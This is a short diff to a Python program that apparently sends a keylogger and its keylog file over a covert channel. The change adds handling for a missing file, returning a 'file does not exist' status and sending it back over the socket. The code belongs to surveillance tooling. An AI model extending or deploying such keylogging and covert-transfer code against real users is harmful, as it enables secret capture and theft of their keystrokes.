@@ -253,7 +253,10 @@ def transfer_keylog_program(sock: socket.socket, dest_ip: str,
     # Initiate transfer of keylog file
     if ack == constants.RECEIVED_CONFIRMATION_MSG:
         print(constants.KEYLOGGER_FILE_ENTER_TIP)
-        transfer_file_covert(sock, dest_ip, dest_port, "", source_port, choices)
+        res = transfer_file_covert(sock, dest_ip, dest_port, "", source_port, choices)
+
+        if res == constants.FILE_DNE:
+            sock.send((constants.FILE_DNE + "/" + constants.FILE_DNE + "/" + constants.FILE_DNE).encode())
 
 
 def protocol_and_field_selector():
@@ -2682,7 +2685,7 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
         print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
-        return None
+        return constants.FILE_DNE
 
 # ========================== EXTRACT COVERT DATA FUNCTIONS ==========================
 
